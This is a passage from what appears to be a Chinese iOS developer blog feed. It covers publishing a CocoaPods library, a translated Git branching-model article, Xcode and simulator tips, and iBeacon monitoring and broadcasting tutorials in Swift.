26th, 03:26 - November 1st, 03:28. IP: 119.136.114.95 创建Git仓库 在 GitHub 上创建一个公开项目，项目中必须包含这几个文件 LICENSE: 开源许可证 README.md: 库的使用介绍文件 你的开源库代码 你的三方库名称.podspec : CocoaPods 的描述文件，这个文件非常重要 这里我们以我仿写的一个demo为例子,如下图： XSSecurityCodeButton-Demo是一个演示项目 XSSecurityCodeButton是一个演示项目 LICENSE开源许可证，如何创建请自行百度/谷歌，非常简单。 README.md库的使用介绍文件，如何创建请自行百度/谷歌，非常简单。 XSSecurityCodeButton.podspecCocoaPods的描述文件 创建.podspec 进入你需要制作开源库的项目根目录 终端执行下面的指令，会在你的仓库下生成 XSSecurityCodeButton.podspec文件 12345// XSSecurityCodeButton 我的项目名称，请自行修改pod spec create XSSecurityCodeButton// 执行完成生成会输入如下信息Specification created at XSSecurityCodeButton.podspec XSSecurityCodeButton.podspec文件配置及修改请参考下面（已删除部分无用的干扰内容），重要的地方我已经给出注释。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Pod::Spec.new do |s| # ――― Spec Metadata ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.name = "XSSecurityCodeButton" s.version = "0.0.1" # 版本号 与 你仓库的 标签号 对应 s.summary = "XSSecurityCodeButton 是一个简约的验证码按钮." s.description = &lt;&lt;-DESC # 这里的描述，必须比s.summary的长度要长。 DESC s.homepage = "https://github.com/SevenCho/XSSecurityCodeButton" # 你的源码页 # s.screenshots = "www.example.com/screenshots_1.gif", "www.example.com/screenshots_2.gif" # ――― Spec License ――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.license = "MIT" # 开源证书 # s.license = &#123; :type =&gt; "MIT", :file =&gt; "FILE_LICENSE" &#125; # ――― Author Metadata ――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.author = &#123; "库发布者" =&gt; "邮箱" &#125; # Or just: s.author = "库发布者" # s.authors = &#123; "库发布者" =&gt; "邮箱" &#125; s.social_media_url = "https://sevencho.github.io" // 你的个人网页，如果有的话 # ――― Platform Specifics ――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.platform = :ios s.platform = :ios, "8.0" # 平台及支持的最低版本 # ――― Source Location ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.source = &#123; :git =&gt; "https://github.com/SevenCho/XSSecurityCodeButton.git", :tag =&gt; "#&#123;s.version&#125;" &#125; # 你的仓库地址，不能用SSH地址 # ――― Source Code ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.source_files = "XSSecurityCodeButton", "XSSecurityCodeButton/**/*.&#123;h,m&#125;" # 你代码的位置， XSSecurityCodeButton/*.&#123;h,m&#125; 表示 XSSecurityCodeButton 文件夹下所有的.h和.m文件 # s.exclude_files = "Classes/Exclude" # 可执行文件 # s.public_header_files = "Classes/**/*.h" # 公共头文件 # ――― Resources ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.resource = "icon.png" # 注意：如果你的代码里包含xib文件，xib属于资源文件，需要resource引入。 # s.resources = "Resources/*.png" # s.preserve_paths = "FilesToSave", "MoreFilesToSave" # ――― Project Linking ―――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # # s.framework = "SomeFramework" s.frameworks = "UIKit", "Foundation" # 支持的框架 # s.library = "iconv" # s.libraries = "iconv", "xml2" # ――― Project Settings ――――――――――――――――――――――――――――――――――――――――――――――――――――――――― # s.requires_arc = true # 需要ARC支持 # s.xcconfig = &#123; "HEADER_SEARCH_PATHS" =&gt; "$(SDKROOT)/usr/include/libxml2" &#125; # s.dependency "JSONKit", "~&gt; 1.4"end 验证 .podspec 文件的格式是否正确 创建完成.podspec文件并按照上面配置完成，接下来我们就需要文件内容及格式是否正确。 终端执行如下指令： 1pod lib lint 验证通过就会输入如下信息 1XSSecurityCodeButton passed validation. 如果你的项目源码被验证出有警告信息，会输出含有如下内容的信息 1(but you can use `--allow-warnings` to ignore them). 此时你只需要在验证指令后面加上对应的提示，重新验证一遍 1pod lib lint --allow-warnings 给仓库打标签 验证成功后，就需要将仓库提交到远程，然后给仓库打上标签并将标签也推送到远程。 标签相当于是你的仓库的一个压缩包，用于稳定存储当前版本。 标签号与你在 s.version = “0.0.1”的版本号一致0.0.1 1234// 创建标签git tag -a 0.0.1 -m &apos;标签说明&apos; // 推送到远程git push origin --tags 发布.podspec 发布项目的描述的文件, 在项目根目录下执行 1pod trunk push XSSecurityCodeButton.podspec 这一步会执行如下操作： 更新本地 pods 库 ~/.cocoaPods.repo/master 验证.podspec格式是否正确-.podspec 文件转成 JSON 格式 对master仓库 进行合并，提交.master仓库地址 发布成功后输入如下内容： 12345678Updating spec repo `master`-------------------------------------------------------------------------------- 🎉 Congrats 🚀 XSSecurityCodeButton (0.0.1) successfully published 📅 June 26th, 04:13 🌎 https://cocoapods.org/pods/XSSecurityCodeButton // 你发布的cocoapods仓库信息，可在浏览器打开查看 👍 Tell your friends! 使用仓库 先更新本地pods仓库信息 更新完成本地仓库后就可以搜索使用我们自己发布的cocoapods仓库了 就可以在需要的项目的Podfile添加、使用自己的仓库了 123pod setup // 更新pod search XSSecurityCodeButton // 搜索pod &apos;XSSecurityCodeButton&apos;, &apos;~&gt; 0.0.1&apos; // 需要使用的项目的Podfile文件中添加后安装，和使用其他三方库一样 更新维护 当我们维护修改了我们的源码文件后就需要重新发布一个新的版本到cocoapods 项目源码打上对应的标签推送到自己的远程仓库 更新XSSecurityCodeButton.podspec中版本号（和新的标签一致） 重新执行pod trunk push XSSecurityCodeButton.podspec --allow-warnings推送发布到pods仓库]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>CocoaPods</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个成功的分支模型]]></title>
    <url>%2Farchives%2F33f710d8.html</url>
    <content type="text"><![CDATA[我是个俗气至顶的人，见山是山，见海是海，见花便是花。唯独见了你，云海开始翻涌，江潮开始澎湃，昆虫的小触须挠着全世界的痒。你无需开口，我和天地万物便通通奔向你。——王小波《爱你就像爱生命》 前言 本文翻译自“A successful Git branching model” 英文原文请点击此处查看 正文 在这篇文章中，我将展示我一年前曾经介绍过的用于我部分项目（无论是在工作还是私人）的开发模式，并且已经证明是非常成功的。我有写这篇文章的打算已经很久了，但直到今天我才有时间彻底的完成它。我不会谈论关于项目的任何细节，仅仅讨论关于分支策略和发布管理。 为什么git？ 关于专业人士的全面讨论以及Git和集中的源代码控制系统的利弊比较，请看这里。那是一个充满了硝烟的战场。作为开发人员，如今我喜欢Git要远超其他工具。Git真正的改变了开发人员想要合并和构建分支的方式。我从经典的CVS / Subversion世界一路走来，合并/分支一直被认为是一个可怕的（“合并冲突要小心，他们会咬你！”）而且这些事你仅仅偶尔做一次。 但是使用Git，这些操作非常简洁和高效，它们也被称作日常工作流程的核心部分之一。例如，在CVS / Subversion 书籍中，分支和合并将在后面的章节（高级用户）中优先讨论，而在 每一本 Git 书中，它已经在第3章（基础知识）中讨论过。 由于其简单性和重复性，分支和合并不再是令人害怕的事情。版本控制工具可以帮助快速的进行分支/合并。 工具到此为止，让我们来看看开发模型。我在这里展示的模型本质上只是一系列的步骤，每个团队成员都必须遵循这些过程来实现可管理的软件开发过程。 分散但集中 我们使用的，且与这个分支模型配合良好的仓库，他有一个“真正”的中央仓库。注意，这个库只是被认为是中央仓库(因为Git是一个分布式的版本控制工具，在技术层面没有所谓的中央仓库)。我们将会为这个仓库起名为origin，因为所有的Git用户对这个名字都比较熟悉。 每个开发者从origin拉取和推送代码。除了集中式的推送拉取外，每个开发者也可以从别的开发者处拉取代码，组成一个子团队。例如当与两个或者更多的人开发一个大的功能时，在将代码推送到origin之前，这种代码管理模式将非常有用。在上图中，存在Alice和Bob，Alice和David，Clair和David三个子团队。 技术上而言，这只不过意味着Alice定义了一个远程Git仓库，起名为bob，实际上指向Bob的版本库，反之亦然(Bob定义了一个远程Git仓库，起名为alice，实际上指向Alice的版本库)。 主分支 在核心地方，当前开发模型受到了已存在模型的很大启发。集中式的版本库有两个永久存在的主分支： master分支 develop分支 origin的master分支每个Git用户都很熟悉。平行的另外一个分支叫做develop分支。 我们认为origin/master这个分支上HEAD引用所指向的代码都是可发布的。 我们认为origin/develop这个分支上HEAD引用所指向的代码总是反应了下一个版本所要交付功能的最新的代码变更。一些人管它叫“整合分支”。它也是自动构建系统执行构建命令的分支。 当develop分支上的代码达到了一个稳定状态，并且准备发布时，所有的代码变更都应该合并到master分支，然后打上发布版本号的tag。具体如何进行这些操作，我们将会讨论 因此，每次代码合并到master分支时，它就是一个人为定义的新的发布产品。理论上来讲，在这里我们应该非常严格，当master分支有新的提交时，我们应该使用Git的钩子脚本执行自动构建命令，然后将软件推送到生产环境的服务器中进行发布。 辅助性分支 紧邻master和develop分支，我们的开发模型采用了另外一种辅助性的分支，以帮助团队成员间的并行开发，特性的简单跟踪，产品的发布准备事宜，以及快速的解决线上问题。不同于主分支，这些辅助性分支往往只要有限的生命周期，因为他们最终会被删除。 我们使用的不同类型分支包括: 特性分支 Release分支 Hotfix 分支 上述的每一个分支都有其特殊目的，也绑定了严格的规则：哪些分支是自己的拉取分支，哪些分支是自己的目标合并分支。 从技术角度看，这些分支的特殊性没有更多的含义。只是按照我们的使用方式对这些分支进行了归类。他们依旧是原Git分支的样子。 功能分支 功能分支可以从develop分支拉取建立，最终必须合并会develop分支。特性分支的命名，除了 master， develop， release-*，或hotfix-*以外，可以随便起名。 功能分支(有时候也成主题分支)用于开发未来某个版本新的特性。当开始一个新特性的开发时，这个特性未来将发布于哪个目标版本，此刻我们是不得而知的。功能分支的本质特征就是只要特性还在开发，他就应该存在，但最终这些功能分支会被合并到develop分支(目的是在新版本中添加新的功能)或者被丢弃(它只是一个令人失望的试验) 功能分支只存在开发者本地版本库，不在远程版本库。 创建功能分支 当开始开发一个新功能时，从develop分支中创建功能分支 12$ git checkout -b myfeature developSwitched to a new branch &quot;myfeature&quot; 在develop分支整合已经开发完成的功能 开发完成的功能必须合并到develop分支，即添加到即将发布的版本中。 12345678$ git checkout developSwitched to branch &apos;develop&apos;$ git merge --no-ff myfeatureUpdating ea1b82a..05e9557(Summary of changes)$ git branch -d myfeatureDeleted branch myfeature (was 05e9557).$ git push origin develop --no-ff参数的作用是在合并的时候，会创建一个新的提交对象，即使是fast-forward方式的合并。这就避免了丢失功能分支的历史记录信息以及提交记录信息。比较一下 在后面的例子中，是不可能从Git历史记录中看到一个已经实现了的功能的所有提交对象-除非你去查看所有的日志信息。要想获取整个功能分支信息，在右面的例子中的确是一个头疼的问题，但是如果使用--no-ff参数就没有这个问题。 使用这个参数后，的确创建了一些新的提交对象(那怕是空提交对象)，但是很值得。 不幸的是，我还没有找到一种方法使Git默认的merge操作带着--no-ff参数，但的确应该这样。 发布分支 从develop分支去建立Release分支，Release分支必须合并到develop分支和master分支，Release分支名可以这样起名:release-*。 Release分支用于支持一个新版本的发布。他们允许在最后时刻进行一些小修小改。甚至允许进行一些小bug的修改，为新版本的发布准要一些元数据(版本号，构建时间等)。通过在release分支完成这些工作，develop分支将会合并这些特性以备下一个大版本的发布。 从develop分支拉取新的release分支的时间点是当开发工作已经达到了新版本的期望值。至少在这个时间点，下一版本准备发布的所有目标特性必须已经合并到了develop分支。更远版本的目标特性不必合并会develop分支。这些特性必须等到个性分支创建后，才能合并回develop分支 在release分支创建好后，就会获取到一个分配好即将发布的版本号，不能更早，就在这个时间点。在此之前，develop分支代码反应出了下一版本的代码变更，但是到底下一版本是 0.3 还是 1.0，不是很明确，直到release分支被建立后一切都确定了。这些决定在release分支开始建立，项目版本号等项目规则出来后就会做出。 创建release分支 从develop分支创建release分支。例如1.1.5版本是当前产品的发布版本，我们即将发布一个更大的版本。develop分支此时已经为下一版本准备好了，我们决定下一版的版本号是1.2(1.1.6或者2.0也可以)。所以我们创建release分支，并给分支赋予新的版本号: 1234567$ git checkout -b release-1.2 developSwitched to a new branch &quot;release-1.2&quot;$ ./bump-version.sh 1.2Files modified successfully, version bumped to 1.2.$ git commit -a -m &quot;Bumped version number to 1.2&quot;[release-1.2 74d9424] Bumped version number to 1.21 files changed, 1 insertions(+), 1 deletions(-) 创建好分支并切到这个分支后，我们给分支打上版本号。bump-version.sh是一个虚构的shell脚本，它更改了工作空间的某些文件来反映新版本特征。(当然也可以手动改变这些文件)，然后版本就被提交了。 新的分支会存在一段时间，直到新版本最终发布。在这段时间里，bug的解决可以在这个分支进行(不要在develop分支进行)。此时是严禁添加新的大特性。这些修改必须合并回develop分支，之后就等待新版本的发布。 完成一个release分支 当release分支的准备成为一个真正的发布版本时，一些操作必须需要执行。首先，将release分支合并回master分支(因为master分支的每一次提交都是预先定义好的一个新版本，谨记)。然后为这次提交打tag，为将来去查看历史版本。最后在release分支做的更改也合并到develop分支，这样的话，将来的其他版本也会包含这些已经解决了的bug。 在Git中需要两步完成: 123456$ git checkout masterSwitched to branch &apos;master&apos;$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes)$ git tag -a 1.2 这样release分支已经完成工作，tag也已经打了。 备注:你可以使用-s or -u 参数为你的tag设置标签签名。 为了保存这些在release分支所做的变更，我们需要将这些变更合并回develop分支。执行如下Git命令: 12345$ git checkout developSwitched to branch &apos;develop&apos;$ git merge --no-ff release-1.2Merge made by recursive.(Summary of changes) 这步有可能会有合并冲突(极有可能，因为我们已经改变了版本号)。如果有冲突，解决掉他，然后提交。 现在我们已经完成了工作，release分支可以删除了，因为我们不在需要他: 12$ git branch -d release-1.2Deleted branch release-1.2 (was ff452fe). Hotfix分支 Hotfix分支从master分支建立，必须合并回develop分支和master分支，为Hotfix分支可以这样起名:hotfix-* Hotfix分支在某种程度上非常像release分支，他们都意味着为某个新版本发布做准备，并且都是预先不可知的。Hotfix分支是基于当前生产环境的产品的一个bug急需解决而必须创建的。当某个版本的产品有一个严重bug需要立即解决，Hotfix分支需要从master分支上该版本对应的tag上进行建立，因为这个tag标记了产品版本 创建hotfix分支 Hotfix分支从master分支进行创建。例如当前线上1.2版本产品因为server端的一个Bug导致系统有问题。但是在develop分支进行更改是不靠谱的，所以我们需要建立hotfix分支，然后开始解决问题: 1234567$ git checkout -b hotfix-1.2.1 masterSwitched to a new branch &quot;hotfix-1.2.1&quot;$ ./bump-version.sh 1.2.1Files modified successfully, version bumped to 1.2.1.$ git commit -a -m &quot;Bumped version number to 1.2.1&quot;[hotfix-1.2.1 41e61bb] Bumped version number to 1.2.11 files changed, 1 insertions(+), 1 deletions(-) 千万别忘记在创建分支后修改版本号。 然后解决掉bug，提交一次或多次。 123$ git commit -m &quot;Fixed severe production problem&quot;[hotfix-1.2.1 abbe5d6] Fixed severe production problem5 files changed, 32 insertions(+), 17 deletions(-) 结束hotfix分支 完成工作后，解决掉的bug代码需要合并回master分支，但同时也需要合并到develop分支，目的是保证在下一版中该bug已经被解决。这多么像release分支啊。 首先，对master分支进行合并更新，然后打tag 123456$ git checkout masterSwitched to branch &apos;master&apos;$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes)$ git tag -a 1.2.1 - 备注:你可以使用-s or -u &lt;key&gt;参数为你的tag设置标签签名。 紧接着，在develop分支合并bugfix代码 12345$ git checkout developSwitched to branch &apos;develop&apos;$ git merge --no-ff hotfix-1.2.1Merge made by recursive.(Summary of changes) 这里可能会有一些异常情况，当一个release分支存在时，hotfix 分支需要合并到release 分支，而不是develop分支。当release分支的使命完成后，合并回release分支的bugfix代码最终也会被合并到develop分支。(当develop分支急需解决这些bug，而等不到release分支的结束，你可以安全的将这些bugfix代码合并到develop分支，这样做也是可以的)。 最后删除这些临时分支 12$ git branch -d hotfix-1.2.1Deleted branch hotfix-1.2.1 (was abbe5d6). 总结 这个分支模型其实没有什么震撼人心的新东西，这篇文章开始的那个“最大图片”已经证明了他在我们工程项目中的巨大作用。它会形成一种优雅的理想模型，而且很容易理解，该模型也允许团队成员形成一个关于分支和版本发布过程的相同理念。 这里有提供一个高质量的分支模型图的PDF版本。去吧，把它挂在墙上随时快速参考。 Git-分支-模型.pdf 更新：任何需要的小伙伴，这里有一个原图的gitflow-model.src.key文件。 参考 A successful Git branching model]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最佳的iOS开发技巧及小窍门]]></title>
    <url>%2Farchives%2Fed90488b.html</url>
    <content type="text"><![CDATA[我选择沉默的主要原因之一：从话语中，你很少能学到人性，从沉默中却能。假如还想学得更多，那就要继续一声不吭 。——王小波《沉默的大多数》 前言 本文翻译自“Best iOS Development Tips and Tricks” 英文原文请点击此处查看 译者注：文中部分功能涉及到视频演示，视频来源YouTube，需科学上网方可观看。 正文1、如果你想知道项目的确切构建时间，请用下面指令开启Xcode的相关功能。1defaults write com.apple.dt.Xcode ShowBuildOperationDuration -bool YES 2、 提升你Swift项目的构建时间 在Xcode 9.2的发布说明中提到一个可以提升Swift项目构建时间的功能（处于实验阶段），使用buildsystemscheduleinherentlyparallelcommandclutly用户默认值启用。 1defaults write com.apple.dt.Xcode BuildSystemScheduleInherentlyParallelCommandsExclusively -bool NO 提示：根据发布说明这是一个试验阶段的功能，会导致构建阶段内存消耗增加。 3、模拟器和Xcode在全屏模式下共存 能在全屏模式下同时使用Xcode和iOS模拟器，可能是我在Xcode9最喜欢的一个功能。你只需要在终端执行下面的指令开启 1defaults write com.apple.iphonesimulator AllowFullscreenMode -bool YES 如果你想使用更多的模拟器的秘密功能，请开启苹果隐藏的内部菜单栏，你需要在用户根目录创建一个名字为AppleInternal的空文件夹，然后执行下面指令重启模拟器即可。 1sudo mkdir /AppleInternal 新的菜单栏就会出现 4、iOS模拟器录制视频 你可以使用xcrun command-line工具截取模拟屏幕快照或者录制模拟器屏幕视频。 录制视频请执行下面指令 1xcrun simctl io booted recordVideo &lt;文件名&gt;.&lt;文件后缀&gt;. 例如： 1xcrun simctl io booted recordVideo appvideo.mov 快捷键control + c停止视频录制，录制的适配文件默认会在当前目录保存。 5、从Finder共享文件到iOS模拟器 从Xcode9开始，模拟器允许使用Finder扩展直接从Finder窗口共享文件。然而，拖动文件到模拟器放开似乎更加快捷。 然而你也可以使用下面simctl命令做一些和图片/视频文件相似的事情。 1xcrun simctl addmedia booted &lt;PATH TO FILE&gt; 6、使用指纹sudo 如果你想使用指纹作为你Macbook Pro执行sudo时的密码，请编辑/etc/pam.d/sudo文件将下面一行添加在文件上面。 1auth sufficient pam_tid.so 现在你可以使用指纹执行sudo了。 7、使用声音通知调试你的自动布局约束 这将是一个非常好的方式去调试自动布局约束，仅仅在启动的时候传递UIConstraintBasedLayoutPlaySoundOnUnsatisfiable参数，当约束在运行时出现糟糕情况的时候就会播放声音。 1-_UIConstraintBasedLayoutPlaySoundOnUnsatisfiable YES 8、移除Xcode中无效的模拟器 这个小命令将移除Xcode中所有无效的模拟器，所谓无效是指对xcode-select无效的Xcode版本。 1xcrun simctl delete unavailable 你最喜欢的功能是什么？请告诉我。]]></content>
      <categories>
        <category>iOS</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>xCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之iBeacon篇(二)]]></title>
    <url>%2Farchives%2Fb05dc691.html</url>
    <content type="text"><![CDATA[那一天我二十一岁，在我一生的黄金时代。我有好多奢望。我想爱，想吃，还想再一瞬间变成天上半明半暗的云。我来我才知道，生活就是个缓慢受锤的过程，人一天天老下去，奢望也一天天消失，最后变得像挨了锤的牛一样。可是我过二十一岁生日时没有预见到这一点。我觉得自己会永远生猛下去，什么也锤不了我。——王小波《黄金时代》 前言 照例，如果只是需要监听iBeacon的demo代码，可以直接点击下载，不需要往下看了😂 如果想了解iBeacon相关信息，请参考iOS蓝牙开发之iBeacon篇(一) 虽然iBeacon也是基于Ble的，从硬件上看也是一套东西，但是Apple公司把他封装成了两套东西，所以在iOS移动端开发来说，这是两个完全不同的东西，调用完全不同框架的api. Apple公司为了省电和隐私限制只能监听指定UUID的iBeacon，无法像安卓一样搜索附近所有的iBeacon信息，虽然iBeacon扫描底层可以获取到附近的所有的iBeacon信息（底层就是获取附近所有的iBeacon然后和当前监听的iBeacon标识对比，然后回调给上层），如果你只是想在你自己的手机上测试下，可以参考AnyiBeacon-iOS这个项目，但是只能作为测试使用，因为涉及到Apple的私有api，是不允许上架App Store的。 想了解iBeacon底层数据协议格式的，可以参考What is the iBeacon Bluetooth Profile 这篇文章。 初始化 在 iOS8.0之后的时候如果想使用iBeacon，必须让用户授权 在info.plist文件里面配置下面的key 123NSLocationAlwaysAndWhenInUseUsageDescription // 推荐NSLocationWhenInUseUsageDescriptionNSLocationAlwaysUsageDescription 在capabilities里面开启Background Modes的 Location updates 由于iBeacon是基于CoreLocation框架的，所以先导入头文件并实例化位置管理者 12import CoreLocationlet locationManager = CLLocationManager() 请求授权并设置代理 12345678override func viewDidLoad()&#123; super.viewDidLoad() // Do any additional setup after loading the view. locationManager.requestAlwaysAuthorization() // 必须要申请权限,否者不会回调扫描到beacons的代理方法 locationManager.delegate = self&#125; 添加需要监听的iBeacon 这个是添加iBeacon信息界面代理回调 123456789101112131415// MARK: AddBeaconextension ItemsViewController: AddBeacon &#123; func addBeacon(item: Item) &#123; items.append(item) tableView.beginUpdates() let newIndexPath = IndexPath(row: items.count - 1, section: 0) tableView.insertRows(at: [newIndexPath], with: .automatic) tableView.endUpdates() startMonitoring(item) // 开始监控 persistItems() // 持久化到本地 &#125;&#125; Item为一个iBeacon信息的数据模型, 即包含如下信息 12345let name: String // 非必须let icon: Int // 非必须let uuid: UUIDlet majorValue: CLBeaconMajorValue // 非必须let minorValue: CLBeaconMinorValue // 非必须 开始监听和停止监听 根据一个iBeacon的参数（iBeacon硬件提供或者自己用iPhone或者mac模拟）初始化一个CLBeaconRegion 两种监听模式 123456789101112func startMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.startMonitoring(for: region) // 低功耗，支持后台监听 locationManager.startRangingBeacons(in: region) // 大功耗，不支持后台监听&#125;// MARK: 根据模型数据初始化一个Beacon Regionfunc asBeaconRegion() -&gt; CLBeaconRegion &#123; return CLBeaconRegion(proximityUUID: uuid, major: majorValue, minor: minorValue, identifier: name)&#125; 如果想停止监听某个iBeacon 123456func stopMonitoring(_ item: Item)&#123; let region = item.asBeaconRegion() locationManager.stopMonitoring(for: region) locationManager.stopRangingBeacons(in: region)&#125; 监听到iBeacon信息回调 开始监听某个Beacon 1234func locationManager(_ manager: CLLocationManager, didStartMonitoringFor region: CLRegion)&#123; print("didStartMonitoringFor\(region)")&#125; 监听到Beacons 12345678910111213141516171819202122232425// MARK: CLLocationManagerDelegateextension ItemsViewController: CLLocationManagerDelegate &#123; func locationManager(_ manager: CLLocationManager, didRangeBeacons beacons: [CLBeacon], in region: CLBeaconRegion) &#123; print("didRangeBeacons \(beacons.count)个") var indexPaths = [IndexPath]() for beacon in beacons &#123; for row in 0..&lt;items.count &#123; // 检测是否是需要监控的beacon if items[row] == beacon &#123; items[row].beacon = beacon indexPaths += [IndexPath(row: row, section: 0)] &#125; &#125; &#125; if let visiblaRows = tableView.indexPathsForVisibleRows &#123; let rowsToUpdate = visiblaRows.filter&#123; indexPaths.contains($0) &#125; for row in rowsToUpdate &#123; // 刷新可见cell上对应的Beacon距离信息 let cell = tableView.cellForRow(at: row) as? ItemCell cell?.refreshLocation() &#125; &#125; &#125; 其他的回调方法 注意： 如果需要监听进入某个区域或者从某个区域离开，则需要在初始化Beacon Region的时候订阅 不然进入和离开区域不回回调 12&gt; region.notifyOnEntry = YES; &gt; region.notifyOnExit = YES; 1234567891011121314151617181920212223// monitoring 监听某个beacon失败 func locationManager(_ manager: CLLocationManager, monitoringDidFailFor region: CLRegion?, withError error: Error)&#123; print("Failed monitoring region\(error.localizedDescription)")&#125;// 位置管理者出现错误信息 func locationManager(_ manager: CLLocationManager, didFailWithError error: Error)&#123; print("Location manager failed \(error.localizedDescription)")&#125;// ranging 监听某个beacon失败 func locationManager(_ manager: CLLocationManager, rangingBeaconsDidFailFor region: CLBeaconRegion, withError error: Error)&#123; print("rangingBeaconsDidFailFor")&#125;// 已经进入到某个区域 func locationManager(_ manager: CLLocationManager, didEnterRegion region: CLRegion) &#123; print("didEnterRegion")&#125;// 已经从某个区域离开 func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; print("didExitRegion")&#125; 关于推送 app现在能显示iBeacon设备，并且还能实时监控它们的距离。但是当app没有处于运行状态时，如iBeacon设备在宠物猫脖子上但是宠物猫跑丢了！ 此时app就需要在猫离开区域的时候通知用户。 在AppDelegate导入通知框架并初始化一个位置管理者 1234import CoreLocationimport UserNotificationsvar locationManager = CLLocationManager() 程序启动的时候，配置位置监听和设置通知 123456789101112func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?) -&gt; Bool &#123; // Override point for customization after application launch. // 注册通知，请求权限 let center = UNUserNotificationCenter.current() center.requestAuthorization(options: [.alert, .sound]) &#123; (granted, error) in &#125; // 设置代理 locationManager.delegate = self return true&#125; 监听目标离开区域并发送本地通知 123456789101112131415extension AppDelegate: CLLocationManagerDelegate&#123; func locationManager(_ manager: CLLocationManager, didExitRegion region: CLRegion) &#123; guard region is CLBeaconRegion else &#123; return &#125; let content = UNMutableNotificationContent() content.title = "Forget Me Not" content.body = "Are you forgetting something?" content.sound = .default() let request = UNNotificationRequest(identifier: "iBeaconDemo", content: content, trigger: nil) UNUserNotificationCenter.current().add(request, withCompletionHandler: nil) &#125;&#125; 参考官方文档维基百科iOS 中 iBeacon 开发iBeacon Tutorial with iOS and SwiftHow to detect ibeacon device without knowing UUID in iOS?Detecting beacons via iBeacon Monitoring &amp; Ranging vs CoreBluetooth scanForPeripheralsWithServices]]></content>
      <categories>
        <category>iOS</category>
        <category>蓝牙</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS蓝牙开发之iBeacon篇(一)]]></title>
    <url>%2Farchives%2F1f6c5df3.html</url>
    <content type="text"><![CDATA[高山有崖, 林木有枝。忧来无方, 人莫之知。——曹丕《善哉行》 什么是iBeacon 如果只是需要iPhone模拟iBeacon的demo代码，可以点击下载，不需要往下看了😂 你曾经想过用手机在一个大型建筑物中为自己定位吗，比如购物中心，或者博物馆。 当然，GPS可以让你得知自己身处哪一座建筑物里。但是如果想要在这些钢筋混凝土堆砌而成的建筑中获得精确的GPS信号，只能祝你好运了。你所需要的是内置在建筑物中一些设备，（通过它们）让手机获取确定你的位置。 iBeacon是Apple公司开发的一种近场通讯协议，于2013年的WWDC开发者大会推出。当你的手持设备靠近一个Beacon基站时，设备就能够感应到Beacon信号，范围可以从几毫米到50米。因为是一种定位技术，苹果将iBeacon相关的接口放到了CoreLocation.framework。 其工作方式是: 配备有低功耗蓝牙（BLE）通信功能的设备(iBeacon)使用BLE技术向周围发送自己特有的UUID，使用iBeacon的App接收到该UUID的应用软件会根据该UUID采取一些行动。 iBeacon的应用场景 当使用者走进某个博物馆时，会扫描到一个 beacon。这个 beacon 有三个标志符 proximityUUID 是一个整个博物馆统一的值，可以用来标识这个博物馆 major 值用来标识特定的展馆，比如唐代展馆，汉代展馆等等 minor 值标识了特定的一个位置的 beacon，例如定位到使用者正在唐代展馆的唐三彩展品的位置。 这时博物馆的 app 会被系统唤醒，app 可以运行一个比较短的时间。在这段时间内，app 可以根据 beacon 的属性查询到使用者的地理位置（通过查询服务器或者本地数据） 例如在唐代展馆的唐三彩展品位置，之后就可以通过一个 local notification 推送这件展品的简介。用户可以点击这次 local notification 来查看更详细的信息，这样一次导览行为就完成了。 可以充当iBeacon的iOS的设备 iPhone4s 或者 之后的iPhone设备 第三代iPad或者 之后iPad设备 iPad mini 或者 之后iPad mini设备 第五代iPod touch 或者之后iPod touch设备 iMac 或者 MacBookPro iBeacon监听方式 Monitoring：低功耗监听，用来判断设备进出ibeacon围栏，支持后台或app进程杀掉后监听。 Ranging：大功率监听，监听当前设备所在区域内的ibeacon信息，包括rssi，距离，不支持后台监听。 基于这两个特性，我们在使用时就分为前台和后台两个场景来实现ibeacon的检测。 iBeacon监听 你的设备当然不会自动监测iBeacon的，所以首先你得告知它。CLBeaconRegion类代表一个iBeacon。 iBeacon与Core Location关联在一起看上去有点奇怪，因为它就是一个蓝牙设备而已，但是也可以这么认为，那就是iBeacon提供小范围定位功能，而GPS提供的是大范围定位功能。 CLBeaconRegion参数介绍 参数 必要字段 作用 identifier 是 标识字符串 proximityUUID 是 一级标识（eg.标识公司） major 否 二级标识（eg.标识店铺） minor 否 三级标识（eg.标识位置） 手机模拟iBeacon 当想让iOS设备充当iBeacon时，你还需要引入Core Bluetooth框架，但只想检测iBeacon设备，你只需要Core Location就行了。 初始化 初始化配置一个iBeacon的参数 beaconUUID 是一个128位的值，可以使用uuidgen生成，但是生成的某些值不可用，推荐使用我提供的这个 初始化一个蓝牙外设管理者， 12345678910111213private let beaconIdentity = "kitty"private let beaconUUID = "B0702880-A295-A8AB-F734-031A98A512DE"private let beaconMajorValue = UInt16(2)private let beaconMinorValue = UInt16(7)private var peripheraManager: CBPeripheralManager?override func viewDidLoad() &#123; super.viewDidLoad() // Do any additional setup after loading the view, typically from a nib. peripheraManager = CBPeripheralManager(delegate: self, queue: .main)&#125; 监听蓝牙状态改变 在inof.plist文件配置Privacy - Bluetooth Peripheral Usage Description请求蓝牙授权 遵守CBPeripheralManagerDelegate协议 123456789101112131415161718192021extension ViewController: CBPeripheralManagerDelegate&#123; func peripheralManagerDidUpdateState(_ peripheral: 